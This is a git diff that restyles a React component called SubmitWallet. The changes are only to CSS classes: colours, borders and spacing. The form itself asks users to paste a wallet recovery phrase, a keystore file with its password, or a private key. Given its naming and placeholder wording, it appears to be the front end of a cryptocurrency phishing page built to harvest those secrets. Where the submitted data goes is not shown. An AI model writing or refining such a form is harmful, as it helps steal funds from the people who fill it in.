@@ -51,11 +51,11 @@ const SubmitWallet = () => {
   return (
     <>
       {isLoading && <Loader />}
-      <div className="py-5 px-4 md:px-0">
-        <div className="flex justify-center flex-col  md:flex-row gap-7 sm:gap-10 md:gap-14 lg:gap-14  md:mb-7 ">
+      <div className="py-10 container mx-auto">
+        <div className="flex justify-center flex-col  md:flex-row gap-7 sm:gap-10 md:gap-14 lg:gap-14 mb-10  md:mb-7 ">
           <button
             onClick={() => switchHandle(1)}
-            className={` text-slate-50 border border-slate-50  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-3xl ${
+            className={` text-slate-50 border border-[#cccccc6e]  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-md ${
               current === 1 ? "bg-[#5b6fdf] border-0" : ""
             }`}
           >
@@ -63,7 +63,7 @@ const SubmitWallet = () => {
           </button>
           <button
             onClick={() => switchHandle(2)}
-            className={`text-slate-50 border border-slate-50  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-3xl ${
+            className={`text-slate-50 border border-[#cccccc6e]  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-md ${
               current === 2 ? "bg-[#5b6fdf] border-0" : ""
             }`}
           >
@@ -71,7 +71,7 @@ const SubmitWallet = () => {
           </button>
           <button
             onClick={() => switchHandle(3)}
-            className={`text-slate-50 border border-slate-50  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-3xl ${
+            className={`text-slate-50 border border-[#cccccc6e]  px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-md ${
               current === 3 ? "bg-[#5b6fdf] border-0" : ""
             }`}
           >
@@ -79,16 +79,16 @@ const SubmitWallet = () => {
           </button>
         </div>
 
-        <div className=" text-center py-14 md:px-14">
+        <div className=" text-center  ">
           <form onSubmit={formSubmit}>
-            <div className="mb-3">
+            <div className="mb-7">
               {current === 1 ? (
                 <div>
                   <textarea
                     value={enteredValue.phrase}
                     name="phrase"
                     onChange={onChangeHandle}
-                    className=" w-[100%] h-[200px] rounded-lg border text-slate-100 bg-transparent  py-3 outline-0 px-3  border-slate-50 mb-7"
+                    className=" w-[100%] h-[200px] rounded-lg border text-slate-100 bg-[#1e234dd5]  py-3 outline-0 px-3  border-[#cccccc6e] mb-7"
                     placeholder="Typically 12 (sometimes 24) words seperated by single spaces"
                   ></textarea>
                 </div>
@@ -100,7 +100,7 @@ const SubmitWallet = () => {
                     value={enteredValue.keystore}
                     onChange={onChangeHandle}
                     name="keystore"
-                    className="w-[100%] h-[200px] text-slate-100 bg-transparent  py-3 outline-0 px-3 rounded-lg border  border-slate-50 mb-5"
+                    className="w-[100%] h-[200px] text-slate-100 bg-[#1e234dd5]  py-3 outline-0 px-3 rounded-lg border  border-[#cccccc6e] mb-5"
                     placeholder="Several lines of text beginning with '(...)' plus the password you used to encypt it."
                   ></textarea>
                   <div>
@@ -108,7 +108,7 @@ const SubmitWallet = () => {
                       value={enteredValue.password}
                       onChange={onChangeHandle}
                       name="password"
-                      className=" w-[100%] text-slate-100 bg-transparent py-3 outline-0 px-3     rounded-lg border mb-7 border-slate-50 "
+                      className=" w-[100%] text-slate-100 bg-[#1e234dd5] py-3 outline-0 px-3     rounded-lg border mb-7 border-[#cccccc6e] "
                       type="text"
                       placeholder="Password"
                     />
@@ -123,7 +123,7 @@ const SubmitWallet = () => {
                     value={enteredValue.privateKey}
                     onChange={onChangeHandle}
                     name="privateKey"
-                    className=" w-[100%] h-[200px] text-slate-100 bg-transparent rounded-lg border py-3 outline-0 px-3  border-slate-50 mb-0"
+                    className=" w-[100%] h-[200px] text-slate-100 bg-[#1e234dd5] rounded-lg border py-3 outline-0 px-3  border-[#cccccc6e] mb-0"
                     placeholder="Typically 12 (sometimes 24) words seperated by single spaces."
                   ></textarea>
                 </div>
